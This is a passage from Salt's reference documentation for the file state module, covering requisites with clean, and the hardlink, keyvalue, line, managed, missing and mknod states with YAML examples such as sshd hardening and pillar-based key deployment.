Because `cmd.run` has no way of communicating that it's creating a file,
`will_always_clean` will remove the newly created file. Of course, every
time the states run the same thing will happen - the
`silly_way_of_creating_a_file` will crete the file and
`will_always_clean` will always remove it. Over and over again, no matter
how many times you run it.

To make this example work correctly, we need to add a `file` state that
targets the file, and a `require` between the file states.

```
silly_way_of_creating_a_file:
  cmd.run:
     - name: mkdir -p /tmp/dont/do/this && echo "seriously" > /tmp/dont/do/this/okay
     - unless: grep seriously /tmp/dont/do/this/okay
  file.managed:
     - name: /tmp/dont/do/this/okay
     - create: False
     - replace: False
     - require_in:
       - file: will_always_clean

```

Now there is a `file` state that `clean` can check, so running those
states will work as expected. The file will be created with the specific
contents, and `clean` will ignore the file because it is being managed by
a salt `file` state. Note that if `require_in` was placed under
`cmd.run`, it would **not** work, because the requisite is for the cmd,
not the file.

```
silly_way_of_creating_a_file:
  cmd.run:
     - name: mkdir -p /tmp/dont/do/this && echo "seriously" > /tmp/dont/do/this/okay
     - unless: grep seriously /tmp/dont/do/this/okay
     # This part should be under file.managed
     - require_in:
       - file: will_always_clean
  file.managed:
     - name: /tmp/dont/do/this/okay
     - create: False
     - replace: False

```

Any other state that creates a file as a result, for example `pkgrepo`,
must have the resulting files referenced in a file state in order for
`clean: True` to ignore them. Also note that the requisite
(`require_in` vs `require`) works in both directions:

```
clean_dir:
  file.directory:
    - name: /tmp/a/better/way
    - require:
      - file: a_better_way

a_better_way:
  file.managed:
    - name: /tmp/a/better/way/truely
    - makedirs: True
    - contents: a much better way

```

Works the same as this:

```
clean_dir:
  file.directory:
    - name: /tmp/a/better/way
    - clean: True

a_better_way:
  file.managed:
    - name: /tmp/a/better/way/truely
    - makedirs: True
    - contents: a much better way
    - require_in:
      - file: clean_dir

```

A common mistake here is to forget the state name and id are both required for requisites:

```
# Correct:
/path/to/some/file:
  file.managed:
    - contents: Cool
    - require_in:
      - file: clean_dir

# Incorrect
/path/to/some/file:
  file.managed:
    - contents: Cool
    - require_in:
      # should be `- file: clean_dir`
      - clean_dir

# Also incorrect
/path/to/some/file:
  file.managed:
    - contents: Cool
    - require_in:
      # should be `- file: clean_dir`
      - file

```

salt.states.file.exists(*name*, *\*\*kwargs*)[¶](#salt.states.file.exists "Permalink to this definition")

Verify that the named file or directory is present or exists.
Ensures pre-requisites outside of Salt's purview
(e.g., keytabs, private keys, etc.) have been previously satisfied before
deployment.

This function does not create the file if it doesn't exist, it will return
an error.

name

Absolute path which must exist

salt.states.file.hardlink(*name*, *target*, *force=False*, *makedirs=False*, *user=None*, *group=None*, *dir\_mode=None*, *\*\*kwargs*)[¶](#salt.states.file.hardlink "Permalink to this definition")

Create a hard link
If the file already exists and is a hard link pointing to any location other
than the specified target, the hard link will be replaced. If the hard link
is a regular file or directory then the state will return False. If the
regular file is desired to be replaced with a hard link pass force: True

name

The location of the hard link to create

target

The location that the hard link points to

force

If the name of the hard link exists and force is set to False, the
state will fail. If force is set to True, the file or directory in the
way of the hard link file will be deleted to make room for the hard
link, unless backupname is set, when it will be renamed

makedirs

If the location of the hard link does not already have a parent directory
then the state will fail, setting makedirs to True will allow Salt to
create the parent directory

user

The user to own any directories made if makedirs is set to true. This
defaults to the user salt is running as on the minion

group

The group ownership set on any directories made if makedirs is set to
true. This defaults to the group salt is running as on the minion. On
Windows, this is ignored

dir\_mode

If directories are to be created, passing this option specifies the
permissions for those directories.

salt.states.file.keyvalue(*name*, *key=None*, *value=None*, *key\_values=None*, *separator='='*, *append\_if\_not\_found=False*, *prepend\_if\_not\_found=False*, *search\_only=False*, *show\_changes=True*, *ignore\_if\_missing=False*, *count=1*, *uncomment=None*, *key\_ignore\_case=False*, *value\_ignore\_case=False*, *create\_if\_missing=False*)[¶](#salt.states.file.keyvalue "Permalink to this definition")

Key/Value based editing of a file.

New in version 3001.

This function differs from `file.replace` in that it is able to search for
keys, followed by a customizable separator, and replace the value with the
given value. Should the value be the same as the one already in the file, no
changes will be made.

Either supply both `key` and `value` parameters, or supply a dictionary
with key / value pairs. It is an error to supply both.

name

Name of the file to search/replace in.

key

Key to search for when ensuring a value. Use in combination with a
`value` parameter.

value

Value to set for a given key. Use in combination with a `key`
parameter.

key\_values

Dictionary of key / value pairs to search for and ensure values for.
Used to specify multiple key / values at once.

separator

Separator which separates key from value.

append\_if\_not\_found

Append the key/value to the end of the file if not found. Note that this
takes precedence over `prepend_if_not_found`.

prepend\_if\_not\_found

Prepend the key/value to the beginning of the file if not found. Note
that `append_if_not_found` takes precedence.

show\_changes

Show a diff of the resulting removals and inserts.

ignore\_if\_missing

Return with success even if the file is not found (or not readable).

count

Number of occurrences to allow (and correct), default is 1. Set to -1 to
replace all, or set to 0 to remove all lines with this key regardsless
of its value.

Note

Any additional occurrences after `count` are removed.
A count of -1 will only replace all occurrences that are currently
uncommented already. Lines commented out will be left alone.

uncomment

Disregard and remove supplied leading characters when finding keys. When
set to None, lines that are commented out are left for what they are.

Note

The argument to `uncomment` is not a prefix string. Rather; it is a
set of characters, each of which are stripped.

key\_ignore\_case

Keys are matched case insensitively. When a value is changed the matched
key is kept as-is.

value\_ignore\_case

Values are checked case insensitively, trying to set e.g. 'Yes' while
the current value is 'yes', will not result in changes when
`value_ignore_case` is set to True.

create\_if\_missing

Create the file if the destination file is not found.

New in version 3007.0.

An example of using `file.keyvalue` to ensure sshd does not allow
for root to login with a password and at the same time setting the
login-gracetime to 1 minute and disabling all forwarding:

```
sshd_config_harden:
    file.keyvalue:
      - name: /etc/ssh/sshd_config
      - key_values:
          permitrootlogin: 'without-password'
          LoginGraceTime: '1m'
          DisableForwarding: 'yes'
      - separator: ' '
      - uncomment: '# '
      - key_ignore_case: True
      - append_if_not_found: True

```

The same example, except for only ensuring PermitRootLogin is set correctly.
Thus being able to use the shorthand `key` and `value` parameters
instead of `key_values`.

```
sshd_config_harden:
    file.keyvalue:
      - name: /etc/ssh/sshd_config
      - key: PermitRootLogin
      - value: without-password
      - separator: ' '
      - uncomment: '# '
      - key_ignore_case: True
      - append_if_not_found: True

```

Note

Notice how the key is not matched case-sensitively, this way it will
correctly identify both 'PermitRootLogin' as well as 'permitrootlogin'.

salt.states.file.line(*name*, *content=None*, *match=None*, *mode=None*, *location=None*, *before=None*, *after=None*, *show\_changes=True*, *backup=False*, *quiet=False*, *indent=True*, *create=False*, *user=None*, *group=None*, *file\_mode=None*)[¶](#salt.states.file.line "Permalink to this definition")

Line-focused editing of a file.

New in version 2015.8.0.

Note

`file.line` exists for historic reasons, and is not
generally recommended. It has a lot of quirks. You may find
`file.replace` to be more suitable.

`file.line` is most useful if you have single lines in a file,
potentially a config file, that you would like to manage. It can
remove, add, and replace lines.

name

Filesystem path to the file to be edited.

content

Content of the line. Allowed to be empty if mode=delete.

match

Match the target line for an action by
a fragment of a string or regular expression.

If neither `before` nor `after` are provided, and `match`
is also `None`, match falls back to the `content` value.

mode

Defines how to edit a line. One of the following options is
required:

* ensure

  If line does not exist, it will be added. If `before`
  and `after` are specified either zero lines, or lines
  that contain the `content` line are allowed to be in between
  `before` and `after`. If there are lines, and none of
  them match then it will produce an error.
* replace

  If line already exists, it will be replaced.
* delete

  Delete the line, if found.
* insert

  Nearly identical to `ensure`. If a line does not exist,
  it will be added.

  The differences are that multiple (and non-matching) lines are
  alloweed between `before` and `after`, if they are
  specified. The line will always be inserted right before
  `before`. `insert` also allows the use of `location` to
  specify that the line should be added at the beginning or end of
  the file.

Note

If `mode=insert` is used, at least one of the following
options must also be defined: `location`, `before`, or
`after`. If `location` is used, it takes precedence
over the other two options.

location

In `mode=insert` only, whether to place the `content` at the
beginning or end of a the file. If `location` is provided,
`before` and `after` are ignored. Valid locations:

* start

  Place the content at the beginning of the file.
* end

  Place the content at the end of the file.

before

Regular expression or an exact case-sensitive fragment of the string.
Will be tried as **both** a regex **and** a part of the line. Must
match **exactly** one line in the file. This value is only used in
`ensure` and `insert` modes. The `content` will be inserted just
before this line, matching its `indent` unless `indent=False`.

after

Regular expression or an exact case-sensitive fragment of the string.
Will be tried as **both** a regex **and** a part of the line. Must
match **exactly** one line in the file. This value is only used in
`ensure` and `insert` modes. The `content` will be inserted
directly after this line, unless `before` is also provided. If
`before` is not matched, indentation will match this line, unless
`indent=False`.

show\_changes

Output a unified diff of the old file and the new file.
If `False` return a boolean if any changes were made.
Default is `True`

Note

Using this option will store two copies of the file in-memory
(the original version and the edited version) in order to generate the diff.

backup

Create a backup of the original file with the extension:
"Year-Month-Day-Hour-Minutes-Seconds".

quiet

Do not raise any exceptions. E.g. ignore the fact that the file that is
tried to be edited does not exist and nothing really happened.

indent

Keep indentation with the previous line. This option is not considered when
the `delete` mode is specified. Default is `True`.

create

Create an empty file if doesn't exist.

New in version 2016.11.0.

user

The user to own the file, this defaults to the user salt is running as
on the minion.

New in version 2016.11.0.

group

The group ownership set for the file, this defaults to the group salt
is running as on the minion On Windows, this is ignored.

New in version 2016.11.0.

file\_mode

The permissions to set on this file, aka 644, 0775, 4664. Not supported
on Windows.

New in version 2016.11.0.

If an equal sign (`=`) appears in an argument to a Salt command, it is
interpreted as a keyword argument in the format of `key=val`. That
processing can be bypassed in order to pass an equal sign through to the
remote shell command by manually specifying the kwarg:

```
update_config:
  file.line:
    - name: /etc/myconfig.conf
    - mode: ensure
    - content: my key = my value
    - before: somekey.*?

```

**Examples:**

Here's a simple config file.

```
[some_config]
# Some config file
# this line will go away

here=False
away=True
goodybe=away

```

And an sls file:

```
remove_lines:
  file.line:
    - name: /some/file.conf
    - mode: delete
    - match: away

```

This will produce:

```
[some_config]
# Some config file

here=False
away=True
goodbye=away

```

If that state is executed 2 more times, this will be the result:

```
[some_config]
# Some config file

here=False

```

Given that original file with this state:

```
replace_things:
  file.line:
    - name: /some/file.conf
    - mode: replace
    - match: away
    - content: here

```

Three passes will this state will result in this file:

```
[some_config]
# Some config file
here

here=False
here
here

```

Each pass replacing the first line found.

Given this file:

```
insert after me
something
insert before me

```

The following state:

```
insert_a_line:
  file.line:
    - name: /some/file.txt
    - mode: insert
    - after: insert after me
    - before: insert before me
    - content: thrice

```

If this state is executed 3 times, the result will be:

```
insert after me
something
thrice
thrice
thrice
insert before me

```

If the mode is ensure instead, it will fail each time. To succeed, we need
to remove the incorrect line between before and after:

```
insert after me
insert before me

```

With an ensure mode, this will insert `thrice` the first time and
make no changes for subsequent calls. For something simple this is
fine, but if you have instead blocks like this:

```
Begin SomeBlock
    foo = bar
End

Begin AnotherBlock
    another = value
End

```

And given this state:

```
ensure_someblock:
  file.line:
    - name: /some/file.conf
    - mode: ensure
    - after: Begin SomeBlock
    - content: this = should be my content
    - before: End

```

This will fail because there are multiple `End` lines. Without that
problem, it still would fail because there is a non-matching line,
`foo = bar`. Ensure **only** allows either zero, or the matching
line present to be present in between `before` and `after`.

salt.states.file.managed(*name*, *source=None*, *source\_hash=''*, *source\_hash\_name=None*, *keep\_source=True*, *user=None*, *group=None*, *mode=None*, *attrs=None*, *template=None*, *makedirs=False*, *dir\_mode=None*, *context=None*, *replace=True*, *defaults=None*, *backup=''*, *show\_changes=True*, *create=True*, *contents=None*, *tmp\_dir=''*, *tmp\_ext=''*, *contents\_pillar=None*, *contents\_grains=None*, *contents\_newline=True*, *contents\_delimiter=':'*, *encoding=None*, *encoding\_errors='strict'*, *allow\_empty=True*, *follow\_symlinks=True*, *check\_cmd=None*, *skip\_verify=False*, *selinux=None*, *win\_owner=None*, *win\_perms=None*, *win\_deny\_perms=None*, *win\_inheritance=True*, *win\_perms\_reset=False*, *verify\_ssl=True*, *use\_etag=False*, *signature=None*, *source\_hash\_sig=None*, *signed\_by\_any=None*, *signed\_by\_all=None*, *keyring=None*, *gnupghome=None*, *\*\*kwargs*)[¶](#salt.states.file.managed "Permalink to this definition")

Manage a given file, this function allows for a file to be downloaded from
the salt master and potentially run through a templating system.

name

The location of the file to manage, as an absolute path.

source

The source file to download to the minion, this source file can be
hosted on either the salt master server (`salt://`), the salt minion
local file system (`/`), or on an HTTP or FTP server (`http(s)://`,
`ftp://`).

Both HTTPS and HTTP are supported as well as downloading directly
from Amazon S3 compatible URLs with both pre-configured and automatic
IAM credentials. (see s3.get state documentation)
File retrieval from Openstack Swift object storage is supported via
swift://container/object\_path URLs, see swift.get documentation.
For files hosted on the salt file server, if the file is located on
the master in the directory named spam, and is called eggs, the source
string is salt://spam/eggs. If source is left blank or None
(use ~ in YAML), the file will be created as an empty file and
the content will not be managed. This is also the case when a file
already exists and the source is undefined; the contents of the file
will not be changed or managed. If source is left blank or None, please
also set replaced to False to make your intention explicit.

If the file is hosted on a HTTP or FTP server then the source\_hash
argument is also required.

A list of sources can also be passed in to provide a default source and
a set of fallbacks. The first source in the list that is found to exist
will be used and subsequent entries in the list will be ignored. Source
list functionality only supports local files and remote files hosted on
the salt master server or retrievable via HTTP, HTTPS, or FTP.

```
file_override_example:
  file.managed:
    - source:
      - salt://file_that_does_not_exist
      - salt://file_that_exists

```

source\_hash
This can be one of the following:

1. a source hash string
2. the URI of a file that contains source hash strings

The function accepts the first encountered long unbroken alphanumeric
string of correct length as a valid hash, in order from most secure to
least secure:

```
Type    Length
======  ======
sha512     128
sha384      96
sha256      64
sha224      56
sha1        40
md5         32

```

**Using a Source Hash File**

The file can contain several checksums for several files. Each line
must contain both the file name and the hash. If no file name is
matched, the first hash encountered will be used, otherwise the most
secure hash with the correct source file name will be used.

When using a source hash file the source\_hash argument needs to be a
url, the standard download urls are supported, ftp, http, salt etc:

Example:

```
tomdroid-src-0.7.3.tar.gz:
  file.managed:
    - name: /tmp/tomdroid-src-0.7.3.tar.gz
    - source: https://launchpad.net/tomdroid/beta/0.7.3/+download/tomdroid-src-0.7.3.tar.gz
    - source_hash: https://launchpad.net/tomdroid/beta/0.7.3/+download/tomdroid-src-0.7.3.hash

```

The following lines are all supported formats:

```
/etc/rc.conf ef6e82e4006dee563d98ada2a2a80a27
sha254c8525aee419eb649f0233be91c151178b30f0dff8ebbdcc8de71b1d5c8bcc06a  /etc/resolv.conf
ead48423703509d37c4a90e6a0d53e143b6fc268

```

Debian file type `*.dsc` files are also supported.

**Inserting the Source Hash in the SLS Data**

The source\_hash can be specified as a simple checksum, like so:

```
tomdroid-src-0.7.3.tar.gz:
  file.managed:
    - name: /tmp/tomdroid-src-0.7.3.tar.gz
    - source: https://launchpad.net/tomdroid/beta/0.7.3/+download/tomdroid-src-0.7.3.tar.gz
    - source_hash: 79eef25f9b0b2c642c62b7f737d4f53f

```

Note

Releases prior to 2016.11.0 must also include the hash type, like
in the below example:

```
tomdroid-src-0.7.3.tar.gz:
  file.managed:
    - name: /tmp/tomdroid-src-0.7.3.tar.gz
    - source: https://launchpad.net/tomdroid/beta/0.7.3/+download/tomdroid-src-0.7.3.tar.gz
    - source_hash: md5=79eef25f9b0b2c642c62b7f737d4f53f

```

source\_hash is ignored if the file hosted is not on a HTTP, HTTPS or FTP server.

Known issues:

If the remote server URL has the hash file as an apparent
sub-directory of the source file, the module will discover that it
has already cached a directory where a file should be cached. For
example:

```
tomdroid-src-0.7.3.tar.gz:
  file.managed:
    - name: /tmp/tomdroid-src-0.7.3.tar.gz
    - source: https://launchpad.net/tomdroid/beta/0.7.3/+download/tomdroid-src-0.7.3.tar.gz
    - source_hash: https://launchpad.net/tomdroid/beta/0.7.3/+download/tomdroid-src-0.7.3.tar.gz/+md5

```

source\_hash\_name

When `source_hash` refers to a hash file, Salt will try to find the
correct hash by matching the filename/URI associated with that hash. By
default, Salt will look for the filename being managed. When managing a
file at path `/tmp/foo.txt`, then the following line in a hash file
would match:

```
acbd18db4cc2f85cedef654fccc4a4d8    foo.txt

```

However, sometimes a hash file will include multiple similar paths:

```
37b51d194a7513e45b56f6524f2d51f2    ./dir1/foo.txt
acbd18db4cc2f85cedef654fccc4a4d8    ./dir2/foo.txt
73feffa4b7f6bb68e44cf984c85f6e88    ./dir3/foo.txt

```

In cases like this, Salt may match the incorrect hash. This argument
can be used to tell Salt which filename to match, to ensure that the
correct hash is identified. For example:

```
/tmp/foo.txt:
  file.managed:
    - source: https://mydomain.tld/dir2/foo.txt
    - source_hash: https://mydomain.tld/hashes
    - source_hash_name: ./dir2/foo.txt

```

Note

This argument must contain the full filename entry from the
checksum file, as this argument is meant to disambiguate matches
for multiple files that have the same basename. So, in the
example above, simply using `foo.txt` would not match.

New in version 2016.3.5.

keep\_source

Set to `False` to discard the cached copy of the source file once the
state completes. This can be useful for larger files to keep them from
taking up space in minion cache. However, keep in mind that discarding
the source file might result in the state needing to re-download the
source file if the state is run again. If the source is not a local or
`salt://` one, the source hash is known, `skip_verify` is not true
and the managed file exists with the correct hash and is not templated,
this is not the case (i.e. remote downloads are avoided if the local hash
matches the expected one).

New in version 2017.7.3.

user

The user to own the file, this defaults to the user salt is running as
on the minion

group

The group ownership set for the file, this defaults to the group salt
is running as on the minion. On Windows, this is ignored

mode

The permissions to set on this file, e.g. `644`, `0775`, or
`4664`.

The default mode for new files and directories corresponds to the
umask of the salt process. The mode of existing files and directories
will only be changed if `mode` is specified.

Note

This option is **not** supported on Windows.

Changed in version 2016.11.0: This option can be set to `keep`, and Salt will keep the mode
from the Salt fileserver. This is only supported when the
`source` URL begins with `salt://`, or for files local to the
minion. Because the `source` option cannot be used with any of
the `contents` options, setting the `mode` to `keep` is also
incompatible with the `contents` options.

Note

keep does not work with salt-ssh.

As a consequence of how the files are transferred to the minion, and
the inability to connect back to the master with salt-ssh, salt is
unable to stat the file as it exists on the fileserver and thus
cannot mirror the mode on the salt-ssh minion

attrs

The attributes to have on this file, e.g. `a`, `i`. The attributes
can be any or a combination of the following characters:
`aAcCdDeijPsStTu`.

Note

This option is **not** supported on Windows.

New in version 2018.3.0.

template

If this setting is applied, the named templating engine will be used to
render the downloaded file. The following templates are supported:

* [`cheetah`](../../renderers/all/salt.renderers.cheetah.html#module-salt.renderers.cheetah "salt.renderers.cheetah")
* [`genshi`](../../renderers/all/salt.renderers.genshi.html#module-salt.renderers.genshi "salt.renderers.genshi")
* [`jinja`](../../renderers/all/salt.renderers.jinja.html#module-salt.renderers.jinja "salt.renderers.jinja")
* [`mako`](../../renderers/all/salt.renderers.mako.html#module-salt.renderers.mako "salt.renderers.mako")
* [`py`](../../renderers/all/salt.renderers.py.html#module-salt.renderers.py "salt.renderers.py")
* [`wempy`](../../renderers/all/salt.renderers.wempy.html#module-salt.renderers.wempy "salt.renderers.wempy")

makedirs

If set to `True`, then the parent directories will be created to
facilitate the creation of the named file. If `False`, and the parent
directory of the destination file doesn't exist, the state will fail.

dir\_mode

If directories are to be created, passing this option specifies the
permissions for those directories. If this is not set, directories
will be assigned permissions by adding the execute bit to the mode of
the files.

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

replace

If set to `False` and the file already exists, the file will not be
modified even if changes would otherwise be made. Permissions and
ownership will still be enforced, however.

context

Overrides default context variables passed to the template.

defaults

Default context passed to the template.

backup

Overrides the default backup mode for this specific file. See
[backup\_mode documentation](../backup_mode.html#file-state-backups) for more details.

show\_changes

Output a unified diff of the old file and the new file. If `False`
return a boolean if any changes were made.

create

If set to `False`, then the file will only be managed if the file
already exists on the system.

contents

Specify the contents of the file. Cannot be used in combination with
`source`. Ignores hashes and does not use a templating engine.

This value can be either a single string, a multiline YAML string or a
list of strings. If a list of strings, then the strings will be joined
together with newlines in the resulting file. For example, the below
two example states would result in identical file contents:

```
/path/to/file1:
  file.managed:
    - contents:
      - This is line 1
      - This is line 2

/path/to/file2:
  file.managed:
    - contents: |
        This is line 1
        This is line 2

```

contents\_pillar

New in version 0.17.0.

Changed in version 2016.11.0: contents\_pillar can also be a list, and the pillars will be
concatenated together to form one file.

Operates like `contents`, but draws from a value stored in pillar,
using the pillar path syntax used in [`pillar.get`](../../modules/all/salt.modules.pillar.html#salt.modules.pillar.get "salt.modules.pillar.get"). This is useful when the pillar value
contains newlines, as referencing a pillar variable using a jinja/mako
template can result in YAML formatting issues due to the newlines
causing indentation mismatches.

For example, the following could be used to deploy an SSH private key:

```
/home/deployer/.ssh/id_rsa:
  file.managed:
    - user: deployer
    - group: deployer
    - mode: 600
    - attrs: a
    - contents_pillar: userdata:deployer:id_rsa

```

This would populate `/home/deployer/.ssh/id_rsa` with the contents of
`pillar['userdata']['deployer']['id_rsa']`. An example of this pillar
setup would be like so:

```
userdata:
  deployer:
    id_rsa: |
        -----BEGIN RSA PRIVATE KEY-----
        MIIEowIBAAKCAQEAoQiwO3JhBquPAalQF9qP1lLZNXVjYMIswrMe2HcWUVBgh+vY
        U7sCwx/dH6+VvNwmCoqmNnP+8gTPKGl1vgAObJAnMT623dMXjVKwnEagZPRJIxDy
        B/HaAre9euNiY3LvIzBTWRSeMfT+rWvIKVBpvwlgGrfgz70m0pqxu+UyFbAGLin+
        GpxzZAMaFpZw4sSbIlRuissXZj/sHpQb8p9M5IeO4Z3rjkCP1cxI
        -----END RSA PRIVATE KEY-----

```

Note

The private key above is shortened to keep the example brief, but
shows how to do multiline string in YAML. The key is followed by a
pipe character, and the multiline string is indented two more
spaces.

To avoid the hassle of creating an indented multiline YAML string,
the [`file_tree external pillar`](../../pillar/all/salt.pillar.file_tree.html#module-salt.pillar.file_tree "salt.pillar.file_tree") can
be used instead. However, this will not work for binary files in
Salt releases before 2015.8.4.

Note

For information on using Salt Slots and how to incorporate
execution module returns into file content or data, refer to the
[Salt Slots documentation](https://docs.saltproject.io/en/latest/topics/slots/index.html).

contents\_grains

New in version 2014.7.0.

Operates like `contents`, but draws from a value stored in grains,
using the grains path syntax used in [`grains.get`](../../modules/all/salt.modules.grains.html#salt.modules.grains.get "salt.modules.grains.get"). This functionality works similarly to
`contents_pillar`, but with grains.

For example, the following could be used to deploy a "message of the day"
file:

```
write_motd:
  file.managed:
    - name: /etc/motd
    - contents_grains: motd

```

This would populate `/etc/motd` file with the contents of the `motd`
grain. The `motd` grain is not a default grain, and would need to be
set prior to running the state:

```
salt '*' grains.set motd 'Welcome! This system is managed by Salt.'

```

contents\_newline

New in version 2014.7.0.

Changed in version 2015.8.4: This option is now ignored if the contents being deployed contain
binary data.

If `True`, files managed using `contents`, `contents_pillar`, or
`contents_grains` will have a newline added to the end of the file if
one is not present. Setting this option to `False` will ensure the
final line, or entry, does not contain a new line. If the last line, or
entry in the file does contain a new line already, this option will not
remove it.

contents\_delimiter

New in version 2015.8.4.

Can be used to specify an alternate delimiter for `contents_pillar`
or `contents_grains`. This delimiter will be passed through to
[`pillar.get`](../../modules/all/salt.modules.pillar.html#salt.modules.pillar.get "salt.modules.pillar.get") or [`grains.get`](../../modules/all/salt.modules.grains.html#salt.modules.grains.get "salt.modules.grains.get") when retrieving the contents.

encoding

If specified, then the specified encoding will be used. Otherwise, the
file will be encoded using the system locale (usually UTF-8). See
<https://docs.python.org/3/library/codecs.html#standard-encodings> for
the list of available encodings.

New in version 2017.7.0.

encoding\_errors

Error encoding scheme. Default is ``'strict'``.
See <https://docs.python.org/2/library/codecs.html#codec-base-classes>
for the list of available schemes.

New in version 2017.7.0.

allow\_empty

New in version 2015.8.4.

If set to `False`, then the state will fail if the contents specified
by `contents_pillar` or `contents_grains` are empty.

follow\_symlinks

New in version 2014.7.0.

If the desired path is a symlink follow it and make changes to the
file to which the symlink points.

check\_cmd

New in version 2014.7.0.

The specified command will be run with an appended argument of a
*temporary* file containing the new managed contents. If the command
exits with a zero status the new managed contents will be written to
the managed destination. If the command exits with a nonzero exit
code, the state will fail and no changes will be made to the file.

For example, the following could be used to verify sudoers before making
changes:

```
/etc/sudoers:
  file.managed:
    - user: root
    - group: root
    - mode: 0440
    - attrs: i
    - source: salt://sudoers/files/sudoers.jinja
    - template: jinja
    - check_cmd: /usr/sbin/visudo -c -f

```

**NOTE**: This `check_cmd` functions differently than the requisite
`check_cmd`.

tmp\_dir

Directory for temp file created by `check_cmd`. Useful for checkers
dependent on config file location (e.g. daemons restricted to their
own config directories by an apparmor profile).

```
/etc/dhcp/dhcpd.conf:
  file.managed:
    - user: root
    - group: root
    - mode: 0755
    - tmp_dir: '/etc/dhcp'
    - contents: "# Managed by Salt"
    - check_cmd: dhcpd -t -cf

```

tmp\_ext

Suffix for temp file created by `check_cmd`. Useful for checkers
dependent on config file extension (e.g. the init-checkconf upstart
config checker).

```
/etc/init/test.conf:
  file.managed:
    - user: root
    - group: root
    - mode: 0440
    - tmp_ext: '.conf'
    - contents:
      - 'description "Salt Minion"'
      - 'start on started mountall'
      - 'stop on shutdown'
      - 'respawn'
      - 'exec salt-minion'
    - check_cmd: init-checkconf -f

```

skip\_verify

If `True`, hash verification of remote file sources (`http://`,
`https://`, `ftp://`) will be skipped, and the `source_hash`
argument will be ignored.

New in version 2016.3.0.

selinux

Allows setting the selinux user, role, type, and range of a managed file

```
/tmp/selinux.test
  file.managed:
    - user: root
    - selinux:
        seuser: system_u
        serole: object_r
        setype: system_conf_t
        serange: s0

```

New in version 3000.

win\_owner

The owner of the directory. If this is not passed, user will be used. If
user is not passed, the account under which Salt is running will be
used.

New in version 2017.7.0.

win\_perms

A dictionary containing permissions to grant and their propagation. For
example: `{'Administrators': {'perms': 'full_control'}}` Can be a
single basic perm or a list of advanced perms. `perms` must be
specified. `applies_to` does not apply to file objects.

New in version 2017.7.0.

win\_deny\_perms

A dictionary containing permissions to deny and their propagation. For
example: `{'Administrators': {'perms': 'full_control'}}` Can be a
single basic perm or a list of advanced perms. `perms` must be
specified. `applies_to` does not apply to file objects.

New in version 2017.7.0.

win\_inheritance

True to inherit permissions from the parent directory, False not to
inherit permission.

New in version 2017.7.0.

win\_perms\_reset

If `True` the existing DACL will be cleared and replaced with the
settings defined in this function. If `False`, new entries will be
appended to the existing DACL. Default is `False`.

New in version 2018.3.0.

Here's an example using the above `win_*` parameters:

```
create_config_file:
  file.managed:
    - name: C:\config\settings.cfg
    - source: salt://settings.cfg
    - win_owner: Administrators
    - win_perms:
        # Basic Permissions
        dev_ops:
          perms: full_control
        # List of advanced permissions
        appuser:
          perms:
            - read_attributes
            - read_ea
            - create_folders
            - read_permissions
        joe_snuffy:
          perms: read
    - win_deny_perms:
        fred_snuffy:
          perms: full_control
    - win_inheritance: False

```

verify\_ssl

If `False`, remote https file sources (`https://`) and source\_hash
will not attempt to validate the servers certificate. Default is True.

New in version 3002.

use\_etag

If `True`, remote http/https file sources will attempt to use the
ETag header to determine if the remote file needs to be downloaded.
This provides a lightweight mechanism for promptly refreshing files
changed on a web server without requiring a full hash comparison via
the `source_hash` parameter.

New in version 3005.

signature

Ensure a valid GPG signature exists on the selected `source` file.
Set this to true for inline signatures, or to a file URI retrievable
by :py:func:`cp.cache\_file <salt.modules.cp.cache\_file>
for a detached one.

Note

A signature is only enforced directly after caching the file,
before it is moved to its final destination. Existing target files
(with the correct checksum) will neither be checked nor deleted.

It will be enforced regardless of source type and will be
required on the final output, therefore this does not lend itself
well when templates are rendered.
The file will not be modified, meaning inline signatures are not
removed.

New in version 3007.0.

source\_hash\_sig

When `source` is a remote file source, `source_hash` is a file,
`skip_verify` is not true and `use_etag` is not true, ensure a
valid GPG signature exists on the source hash file.
Set this to `true` for an inline (clearsigned) signature, or to a
file URI retrievable by :py:func:`cp.cache\_file <salt.modules.cp.cache\_file>
for a detached one.

Note

A signature on the `source_hash` file is enforced regardless of
changes since its contents are used to check if an existing file
is in the correct state - but only for remote sources!
As for `signature`, existing target files will not be modified,
only the cached source\_hash and source\_hash\_sig files will be removed.

New in version 3007.0.

signed\_by\_any

When verifying signatures either on the managed file or its source hash file,
require at least one valid signature from one of a list of key fingerprints.
This is passed to [`gpg.verify`](../../modules/all/salt.modules.gpg.html#salt.modules.gpg.verify "salt.modules.gpg.verify").

New in version 3007.0.

signed\_by\_all

When verifying signatures either on the managed file or its source hash file,
require a valid signature from each of the key fingerprints in this list.
This is passed to [`gpg.verify`](../../modules/all/salt.modules.gpg.html#salt.modules.gpg.verify "salt.modules.gpg.verify").

New in version 3007.0.

keyring

When verifying signatures, use this keyring.

New in version 3007.0.

gnupghome

When verifying signatures, use this GnuPG home.

New in version 3007.0.

salt.states.file.missing(*name*, *\*\*kwargs*)[¶](#salt.states.file.missing "Permalink to this definition")

Verify that the named file or directory is missing, this returns True only
if the named file is missing but does not remove the file if it is present.

name

Absolute path which must NOT exist

salt.states.file.mknod(*name*, *ntype*, *major=0*, *minor=0*, *user=None*, *group=None*, *mode='0600'*)[¶](#salt.states.file.mknod "Permalink to this definition")

Create a special file similar to the 'nix mknod command. The supported
device types are `p` (fifo pipe), `c` (character device), and `b`
(block device). Provide the major and minor numbers when specifying a
character device or block device. A fifo pipe does not require this
information. The command will create the necessary dirs if needed. If a
file of the same name not of the same type/major/minor exists, it will not
be overwritten or unlinked (deleted). This is logically in place as a
safety measure because you can really shoot yourself in the foot here and
it is the behavior of 'nix `mknod`. It is also important to note that not
just anyone can create special devices. Usually this is only done as root.
If the state is executed as none other than root on a minion, you may
receive a permission error.

name

name of the file

ntype

node type 'p' (fifo pipe), 'c' (character device), or 'b'
(block device)

major

major number of the device
does not apply to a fifo pipe

minor

minor number of the device
does not apply to a fifo pipe

user

owning user of the device/pipe

group

owning group of the device/pipe

mode

permissions on the device/pipe

Usage:

```
/dev/chr:
  file.mknod:
    - ntype: c
    - major: 180
    - minor: 31
    - user: root
    - group: root
    - mode: 660

/dev/blk:
  file.mknod:
    - ntype: b
    - major: 8
    - minor: 999
    - user: root
    - group: root
    - mode: 660

/dev/fifo:
  file.mknod:
    - ntype: p
    - user: root
    - group: root
    - mode: 660

```

New in version 0.17.0.

salt.states.file.mod\_beacon(*name*, *\*\*kwargs*)[¶](#salt.states.file.mod_beacon "Permalink to this definition")

Create a beacon to monitor a file based on a beacon state argument.

Note

This state exists to support special handling of the `beacon`
